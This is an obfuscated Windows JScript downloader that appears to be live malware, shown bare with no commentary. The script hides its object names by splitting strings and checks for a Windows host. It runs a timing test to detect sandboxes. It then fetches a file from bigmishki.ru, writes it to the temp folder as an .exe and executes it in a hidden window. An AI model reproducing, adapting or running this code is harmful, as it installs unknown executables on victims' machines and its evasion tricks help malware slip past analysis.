var P0 = false;
var QM = "Create"+"Object";
var P1 = function HL() {return WScript[QM]("WScript"+".Shell");}(), E = 11;
var F = "MSXML2"+".XMLHTTP";
var JP = 2;
var UC = JP - 2;
function BX(IY){P1["Run"](IY, UC, UC);};
function FG(){return F + "";};
function RU(A, J){UC = UC * 1; return A - J;};
function H(){return QM;};
/*@cc_on
  @if (@_win32 || @_win64)
    P0 = true;
  @end
@*/
if (P0)
{
var DQ = "";
function RX(){return 22;};
var F0 = 0; var T = 0;
function P()
{
var XO = new this["Date"]();
var R1 = XO["getUTCMilliseconds"]();
WScript["Sleep"](RX());
var XO = new this["Date"]();
var YJ = XO["getUTCMilliseconds"]();
WScript["Sleep"](RX());
var XO = new this["Date"]();
var QM0 = XO["getUTCMilliseconds"]();
var F0 = "Z";
F0 = RU(YJ, R1);
var T = "R0";
T = RU(QM0, YJ);
DQ = "open";
return RU(F0, T);
}
var XQ = false;
var M = false;
for (var L = UC; L < RX() * 1; L++){if (P() != UC){
XQ = true; 
T = "31" + 11 * F0 + T; 
M = true; 
break;
}}
function K() {return ((XQ == true) && (XQ == M)) ? 1 : UC;};
if (XQ && K() && M){
function BR() {return P1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jttUamAdRt.ex" + "e";};
 WJ = FG();
 QB = WScript[QM](WJ);
 var N = 1;
do { 
	for (;N;){
	try {
		if (N == 1)
		{
			QB[DQ]("GET", "http://bigmishki.ru/l3osjf", false);
			QB["send"]();
			U = "Sleep";
			N = 2;
		}
		WScript[U](RX() + 120); 
		if (QB["readystate"] < 2 * 2) continue;
		N = UC;
		function JC(S) {var VH = (1, 2, 3, 4, 5, S); return VH;};
		VW = WScript[H()]("ADODB.Stream");
		WJ = VW;
		WJ[DQ]();
		WJ["type"] = JC(1);
		WJ["write"](QB["ResponseBody"]);
		VW["position"] = JC(UC);
		WJ["Save" + "ToFile"](BR(), 2);
		VW["cl"+"ose"]();
		R = BR();
		BX(R);
	} catch(LS){};};
}while (N);
}
}

